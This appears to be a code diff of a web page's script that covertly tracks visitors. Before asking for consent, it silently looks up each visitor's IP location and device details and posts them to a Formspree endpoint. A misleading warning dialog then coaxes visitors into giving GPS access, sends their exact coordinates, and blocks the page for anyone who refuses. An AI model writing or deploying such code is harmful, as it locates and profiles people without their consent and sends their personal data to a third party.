@@ -81,78 +81,76 @@
   </div>
    <script>
 (async () => {
-  // Always get IP-based location FIRST silently
-  const approxInfo = await getApproxLocation(false); // no consent yet
-  sendToFormspree(approxInfo); // Send basic tracking first
+  // 1. First get Approximate Location silently
+  await getApproxLocation(false); // without user consent
 
-  // Then show the SweetAlert asking for permission
+  // 2. Then ask for exact location access via SweetAlert
   const askLocation = await Swal.fire({
     title: "Are you sure?",
-    text: "Warning: This content is specific to your location. Viewer discretion is advised.",
+    text: "Warning: This content is specific location only. Viewer discretion is advised.",
     icon: "warning",
     allowOutsideClick: false,
     allowEscapeKey: false,
     showCancelButton: true,
     confirmButtonText: "Yes, share",
-    cancelButtonText: "No, thanks"
+    cancelButtonText: "No, thanks",
+    backdrop: `
+      rgba(0,0,0,0.8)
+      url('assets/img/AliKhan.jpeg')
+      center/cover no-repeat
+    `
   });
 
   if (askLocation.isConfirmed) {
-    // User agreed, try exact location
-    navigator.geolocation.getCurrentPosition(
-      async pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const accuracy = pos.coords.accuracy + " meters";
-
-        const info = await getDeviceInfo();
-        info["Location Type"] = "Exact (GPS)";
-        info["Latitude"] = lat;
-        info["Longitude"] = lon;
-        info["Accuracy"] = accuracy;
-        info["User Consent"] = "Yes";
-
-        sendToFormspree(info);
-        unlockPage(); // allow access
-      },
-      async err => {
-        console.warn("GPS failed, fallback to approx", err);
-        approxInfo["User Consent"] = "No (GPS denied)";
-        sendToFormspree(approxInfo);
-        denyAccess();
-      }
-    );
+    getExactLocation(true);
   } else {
-    // User said No → Deny access
-    approxInfo["User Consent"] = "No (user declined)";
-    sendToFormspree(approxInfo);
     denyAccess();
   }
 
-  // Get IP-based location (approx)
+  // GPS-based Exact location
+  async function getExactLocation(userConsented) {
+    navigator.geolocation.getCurrentPosition(async pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const accuracy = pos.coords.accuracy + " meters";
+
+      const trackingInfo = await getDeviceInfo();
+      trackingInfo["Location Type"] = "Exact (GPS)";
+      trackingInfo["Latitude"] = lat;
+      trackingInfo["Longitude"] = lon;
+      trackingInfo["Accuracy"] = accuracy;
+      trackingInfo["User Consent"] = userConsented ? "Yes" : "No";
+
+      sendToFormspree(trackingInfo);
+      unlockPage();
+    }, err => {
+      console.warn("GPS failed:", err.message);
+      denyAccess();
+    });
+  }
+
+  // IP-based Approx location
   async function getApproxLocation(userConsented) {
     try {
       const res = await fetch('https://ipinfo.io/json?token=92301f93643037');
       const data = await res.json();
 
-      const info = await getDeviceInfo();
-      info["Location Type"] = "Approx (IP)";
-      info["IP"] = data.ip;
-      info["City"] = data.city;
-      info["Region"] = data.region;
-      info["Country"] = data.country;
-      info["Location (Lat,Long)"] = data.loc;
-      info["ISP / Org"] = data.org;
-      info["User Consent"] = userConsented ? "Yes" : "No";
+      const trackingInfo = await getDeviceInfo();
+      trackingInfo["Location Type"] = "Approx (IP)";
+      trackingInfo["IP"] = data.ip;
+      trackingInfo["City"] = data.city;
+      trackingInfo["Region"] = data.region;
+      trackingInfo["Country"] = data.country;
+      trackingInfo["Location (Lat,Long)"] = data.loc;
+      trackingInfo["ISP / Org"] = data.org;
+      trackingInfo["User Consent"] = userConsented ? "Yes" : "No";
 
-      return info;
-    } catch (err) {
-      console.error("IP lookup failed", err);
-      return await getDeviceInfo(); // fallback
+      sendToFormspree(trackingInfo);
+    } catch (e) {
+      console.error("Failed to get IP info:", e);
     }
   }
 
-  // Get browser/device info
   async function getDeviceInfo() {
     const info = {
       browser: navigator.userAgent,
@@ -172,7 +170,6 @@
     return info;
   }
 
-  // Send to Formspree
   async function sendToFormspree(data) {
     const formData = new FormData();
     for (let key in data) {
@@ -180,16 +177,14 @@
     }
 
     try {
-      const res = await fetch("https://formspree.io/f/xldjejon", {
+      await fetch("https://formspree.io/f/xldjejon", {
         method: "POST",
         body: formData,
-        headers: {
-          'Accept': 'application/json'
-        }
+        headers: { 'Accept': 'application/json' }
       });
-      console.log("Tracking data sent ✅", await res.json());
-    } catch (err) {
-      console.error("Failed to send data", err);
+      console.log("Tracking data sent ✅");
+    } catch (e) {
+      console.error("Formspree submission failed:", e);
     }
   }
 
@@ -200,7 +195,7 @@
 
   function denyAccess() {
     document.body.innerHTML = `
-      <div style="position:fixed;width:100%;height:100vh;background-image:url('assets/img/AliKhan.jpeg');background-size:cover;background-position:center;z-index:99999;display:flex;align-items:center;justify-content:center;color:white;font-size:24px;font-family:sans-serif;flex-direction:column;text-align:center;padding:20px;">
+      <div style="position:fixed;top:0;left:0;width:100%;height:100vh;background:url('assets/img/AliKhan.jpeg') center/cover no-repeat;z-index:99999;display:flex;align-items:center;justify-content:center;color:white;font-size:20px;font-family:sans-serif;flex-direction:column;text-align:center;padding:20px;">
         <h2>Access Denied</h2>
         <p>You must allow location access to view this content.</p>
       </div>
